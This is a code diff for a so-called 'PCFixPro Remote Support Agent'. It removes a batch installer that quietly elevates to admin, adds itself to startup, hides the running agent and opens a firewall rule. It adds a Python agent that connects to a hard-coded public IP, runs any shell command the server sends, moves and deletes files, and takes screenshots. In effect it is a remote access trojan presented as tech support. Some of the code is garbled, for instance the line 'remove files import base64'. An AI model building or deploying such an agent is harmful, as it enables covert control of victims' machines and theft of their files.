@@ -1,157 +1,185 @@
-@echo off
-:: PCFixPro Remote Support Agent - Embedded Installer v3.0
-:: All code embedded - no external files needed
-:: Single click installation with automatic IP logging
-:: CONNECTS TO PUBLIC DASHBOARD IP: 102.209.236.22
+"""
+PCFixPro Remote Support Agent - Environment Configurable
+Set PCFIXPRO_SERVER_URL environment variable to your VPS IP
+"""
+import socketio
+import requests
+import json
+import os
+import sys
+import platform
+import subprocess
+import threading
+import time
+from datetime import datetime
+remove files import base64
+from io import BytesIO
 
-setlocal enabledelayedexpansion
+# Configuration - uses environment variable or defaults to public IP
+SERVER_URL = os.environ.get('PCFIXPRO_SERVER_URL', 'http://102.209.236.22:5000')
+AGENT_ID = None
 
-:: Configuration - Using PUBLIC IP for remote connections
-set SERVER_IP=102.209.236.22
-set SERVER_PORT=5000
-set INSTALL_DIR=C:\Program Files\PCFixPro Agent
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
 
-echo ========================================
-echo PCFixPro Remote Support Agent Installer
-echo ========================================
-echo.
+def get_system_info():
+    """Collect system information"""
+    try:
+        info = {
+            "hostname": platform.node(),
+            "ip_address": get_local_ip(),
+            "os": f"{platform.system()} {platform.release()}",
+            "architecture": platform.machine(),
+            "processor": platform.processor(),
+            "agent_version": "1.0.0",
+            "status": "online",
+            "last_seen": datetime.now().isoformat()
+        }
+        return info
+    except Exception as e:
+        return {"hostname": platform.node(), "status": "online"}
 
-:: Get client IP using multiple methods
-for /f "tokens=2 delims=[]" %%a in ('ping -4 -n 1 8.8.8.8 ^| findstr "["') do set CLIENT_IP=%%a
-if "!CLIENT_IP!"=="" set CLIENT_IP=127.0.0.1
+class RemoteAgent:
+    def __init__(self):
+        self.sio = socketio.Client()
+        self.agent_id = None
+        self.server_url = SERVER_URL
+        self.setup_socket_handlers()
+        
+    def setup_socket_handlers(self):
+        @self.sio.event
+        def connect():
+            print(f"[AGENT] Connected to {self.server_url}")
+            self.sio.emit('register_agent', get_system_info())
+            
+        @self.sio.event
+        def disconnect():
+            print("[AGENT] Disconnected. Reconnecting...")
+            time.sleep(5)
+            
+        @self.sio.event
+        def registered(data):
+            self.agent_id = data.get('agent_id')
+            print(f"[AGENT] Registered: {self.agent_id}")
+            
+        @self.sio.event
+        def execute_command(data):
+            command = data.get('command')
+            command_id = data.get('command_id')
+            try:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+                self.sio.emit('command_result', {
+                    'command_id': command_id,
+                    'output': result.stdout + result.stderr,
+                    'return_code': result.returncode,
+                    'timestamp': datetime.now().isoformat()
+                })
+            except Exception as e:
+                self.sio.emit('command_result', {'command_id': command_id, 'output': str(e), 'return_code': -1})
 
-:: Log the IP
-echo [INFO] Client IP detected: !CLIENT_IP!
-echo [INFO] Server: http://%SERVER_IP%:5000
-echo [INFO] Hostname: %COMPUTERNAME%
-echo.
+        @self.sio.event
+        def list_files(data):
+            path = data.get('path', '.')
+            try:
+                entries = []
+                for item in sorted(os.listdir(path)):
+                    full_path = os.path.join(path, item)
+                    try:
+                        stat = os.stat(full_path)
+                        entries.append({
+                            'name': item, 'path': full_path,
+                            'is_dir': os.path.isdir(full_path),
+                            'size': stat.st_size if not os.path.isdir(full_path) else 0,
+                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
+                        })
+                    except:
+                        pass
+                self.sio.emit('file_list', {'path': path, 'files': entries, 'command_id': data.get('command_id')})
+            except Exception as e:
+                self.sio.emit('file_list', {'path': path, 'error': str(e), 'command_id': data.get('command_id')})
 
-:: Auto-elevate to admin privileges
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    echo [INFO] Requesting administrator privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs" -WindowStyle Hidden
-    exit /b
-)
+        @self.sio.event
+        def upload_file(data):
+            filename = data.get('filename')
+            content_b64 = data.get('content')
+            remote_path = data.get('path', '.')
+            try:
+                file_data = base64.b64decode(content_b64)
+                full_path = os.path.join(remote_path, os.path.basename(filename))
+                with open(full_path, 'wb') as f:
+                    f.write(file_data)
+                self.sio.emit('upload_result', {'status': 'success', 'filename': filename, 'path': full_path, 'command_id': data.get('command_id')})
+            except Exception as e:
+                self.sio.emit('upload_result', {'status': 'error', 'error': str(e), 'command_id': data.get('command_id')})
 
-echo [OK] Administrator privileges confirmed
-echo.
+        @self.sio.event
+        def download_file(data):
+            file_path = data.get('path')
+            try:
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                self.sio.emit('download_result', {
+                    'status': 'success', 'path': file_path,
+                    'filename': os.path.basename(file_path),
+                    'content': base64.b64encode(content).decode('utf-8'),
+                    'size': len(content),
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('download_result', {'status': 'error', 'error': str(e), 'command_id': data.get('command_id')})
 
-:: Create installation directory
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+        @self.sio.event
+        def delete_file(data):
+            file_path = data.get('path')
+            try:
+                if os.path.isdir(file_path):
+                    os.rmdir(file_path)
+                else:
+                    os.remove(file_path)
+                self.sio.emit('delete_result', {'status': 'success', 'path': file_path, 'command_id': data.get('command_id')})
+            except Exception as e:
+                self.sio.emit('delete_result', {'status': 'error', 'error': str(e), 'command_id': data.get('command_id')})
 
-:: Create session log with IP
-echo Installation started: %date% %time% > "%INSTALL_DIR%\session.log"
-echo Server IP: %SERVER_IP% >> "%INSTALL_DIR%\session.log"
-echo Client IP: %CLIENT_IP% >> "%INSTALL_DIR%\session.log"
-echo Hostname: %COMPUTERNAME% >> "%INSTALL_DIR%\session.log"
+        @self.sio.event
+        def screenshot(data):
+            try:
+                from PIL import ImageGrab
+                img = ImageGrab.grab()
+                buffered = BytesIO()
+                img.save(buffered, format="PNG")
+                self.sio.emit('screenshot_result', {
+                    'status': 'success',
+                    'content': base64.b64encode(buffered.getvalue()).decode('utf-8'),
+                    'format': 'png',
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('screenshot_result', {'status': 'error', 'error': str(e), 'command_id': data.get('command_id')})
 
-:: Write agent.py (embedded) - CONNECTS TO YOUR PUBLIC IP
-echo import socketio > "%INSTALL_DIR%\agent.py"
-echo import subprocess >> "%INSTALL_DIR%\agent.py"
-echo import os, sys, platform, json, time, base64 >> "%INSTALL_DIR%\agent.py"
-echo from datetime import datetime >> "%INSTALL_DIR%\agent.py"
-echo from io import BytesIO >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo SERVER_URL = "http://102.209.236.22:5000" >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo def get_local_ip^(^): >> "%INSTALL_DIR%\agent.py"
-echo     try: >> "%INSTALL_DIR%\agent.py"
-echo         import socket >> "%INSTALL_DIR%\agent.py"
-echo         s = socket.socket^(socket.AF_INET, socket.SOCK_DGRAM^) >> "%INSTALL_DIR%\agent.py"
-echo         s.connect^(("8.8.8.8", 80^)^) >> "%INSTALL_DIR%\agent.py"
-echo         ip = s.getsockname^(^)[0] >> "%INSTALL_DIR%\agent.py"
-echo         s.close^(^) >> "%INSTALL_DIR%\agent.py"
-echo         return ip >> "%INSTALL_DIR%\agent.py"
-echo     except: >> "%INSTALL_DIR%\agent.py"
-echo         return "127.0.0.1" >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo def get_system_info^(^): >> "%INSTALL_DIR%\agent.py"
-echo     return {{ >> "%INSTALL_DIR%\agent.py"
-echo         "hostname": os.environ.get^("COMPUTERNAME", "Unknown"^), >> "%INSTALL_DIR%\agent.py"
-echo         "ip_address": get_local_ip^(^), >> "%INSTALL_DIR%\agent.py"
-echo         "os": platform.system^(^) + " " + platform.release^(^), >> "%INSTALL_DIR%\agent.py"
-echo         "agent_version": "1.0.0", >> "%INSTALL_DIR%\agent.py"
-echo         "status": "online", >> "%INSTALL_DIR%\agent.py"
-echo         "last_seen": datetime.now^(^).isoformat^(^) >> "%INSTALL_DIR%\agent.py"
-echo     }} >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo class RemoteAgent: >> "%INSTALL_DIR%\agent.py"
-echo     def __init__(self^): >> "%INSTALL_DIR%\agent.py"
-echo         self.sio = socketio.Client^(^) >> "%INSTALL_DIR%\agent.py"
-echo         self.agent_id = None >> "%INSTALL_DIR%\agent.py"
-echo         self.setup_handlers^(^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo     def setup_handlers(self^): >> "%INSTALL_DIR%\agent.py"
-echo         @self.sio.event >> "%INSTALL_DIR%\agent.py"
-echo         def connect^(self^): >> "%INSTALL_DIR%\agent.py"
-echo             print^("[AGENT] Connected to dashboard"^) >> "%INSTALL_DIR%\agent.py"
-echo             self.sio.emit^('register_agent', get_system_info^(^)^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo         @self.sio.event >> "%INSTALL_DIR%\agent.py"
-echo         def registered(self, data^): >> "%INSTALL_DIR%\agent.py"
-echo             self.agent_id = data.get^('agent_id'^) >> "%INSTALL_DIR%\agent.py"
-echo             print^(f"[AGENT] ID: {{self.agent_id}}"^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo         @self.sio.event >> "%INSTALL_DIR%\agent.py"
-echo         def execute_command(self, data^): >> "%INSTALL_DIR%\agent.py"
-echo             cmd = data.get^('command'^) >> "%INSTALL_DIR%\agent.py"
-echo             result = subprocess.run^(cmd, shell=True, capture_output=True, text=True, timeout=30^) >> "%INSTALL_DIR%\agent.py"
-echo             self.sio.emit^('command_result', {{'output': result.stdout + result.stderr}}^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo         @self.sio.event >> "%INSTALL_DIR%\agent.py"
-echo         def list_files(self, data^): >> "%INSTALL_DIR%\agent.py"
-echo             import os >> "%INSTALL_DIR%\agent.py"
-echo             path = data.get^('path', '.'^) >> "%INSTALL_DIR%\agent.py"
-echo             entries = [{{'name': f, 'path': os.path.join^(path,f^), 'is_dir': os.path.isdir^(os.path.join^(path,f^)^)}} for f in os.listdir^(path^)] >> "%INSTALL_DIR%\agent.py"
-echo             self.sio.emit^('file_list', {{'files': entries, 'path': path}}^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo     def run(self^): >> "%INSTALL_DIR%\agent.py"
-echo         self.sio.connect^(SERVER_URL, transports=['websocket','polling']^) >> "%INSTALL_DIR%\agent.py"
-echo         while True: time.sleep^(60^); self.sio.emit^('heartbeat', {{'agent_id': self.agent_id}}^) >> "%INSTALL_DIR%\agent.py"
-echo. >> "%INSTALL_DIR%\agent.py"
-echo if __name__ == "__main__": >> "%INSTALL_DIR%\agent.py"
-echo     RemoteAgent^(^).run^(^) >> "%INSTALL_DIR%\agent.py"
+    def connect(self):
+        while True:
+            try:
+                if not self.sio.connected:
+                    self.sio.connect(self.server_url, transports=['websocket', 'polling'])
+                    while self.sio.connected:
+                        time.sleep(30)
+                        self.sio.emit('heartbeat', {'agent_id': self.agent_id})
+            except Exception as e:
+                print(f"Connection error: {e}. Retrying in 10s...")
+                time.sleep(10)
+    
+    def run(self):
+        print(f"Starting PCFixPro Agent...")
+        print(f"Server: {self.server_url}")
+        self.connect()
 
-:: Install Python dependencies silently
-echo [1/3] Installing dependencies...
-pip install python-socketio requests psutil Pillow --quiet --no-warn-script-location 2>nul
-
-:: Add to Windows startup for auto-reconnect
-echo [2/3] Configuring auto-startup...
-copy "%INSTALL_DIR%\agent.py" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pcfixpro_agent.py" >nul 2>&1
-
-:: Start the agent hidden
-echo [3/3] Starting agent...
-cd /d "%INSTALL_DIR%"
-start /B pythonw.exe "%INSTALL_DIR%\agent.py"
-
-:: Create firewall exception (for client outgoing connections)
-netsh advfirewall firewall delete rule name="PCFixPro Agent" >nul 2>&1
-netsh advfirewall firewall add rule name="PCFixPro Agent" dir=out action=allow program="pythonw.exe" enable=yes >nul 2>&1
-
-:: Update session log
-echo Installation complete: %date% %time% >> "%INSTALL_DIR%\session.log"
-echo Server: http://102.209.236.22:5000 >> "%INSTALL_DIR%\session.log"
-
-:: Create status file on desktop
-echo PCFixPro Agent Installed Successfully > "%USERPROFILE%\Desktop\PCFixPro_Agent_Status.txt"
-echo Server: http://102.209.236.22:5000 >> "%USERPROFILE%\Desktop\PCFixPro_Agent_Status.txt"
-echo Your IP: %CLIENT_IP% >> "%USERPROFILE%\Desktop\PCFixPro_Agent_Status.txt"
-echo Hostname: %COMPUTERNAME% >> "%USERPROFILE%\Desktop\PCFixPro_Agent_Status.txt"
-echo Installation Date: %date% %time% >> "%USERPROFILE%\Desktop\PCFixPro_Agent_Status.txt"
-
-echo.
-echo ========================================
-echo Installation Complete!
-echo ========================================
-echo Server: http://102.209.236.22:5000
-echo Client IP: %CLIENT_IP%
-echo Hostname: %COMPUTERNAME%
-echo.
-echo Status file created on your desktop.
-echo The agent will appear in the dashboard within 30 seconds.
-echo ========================================
-echo.
-timeout /t 5 /nobreak >nul
-exit
+if __name__ == "__main__":
+    agent = RemoteAgent()
+    agent.run()
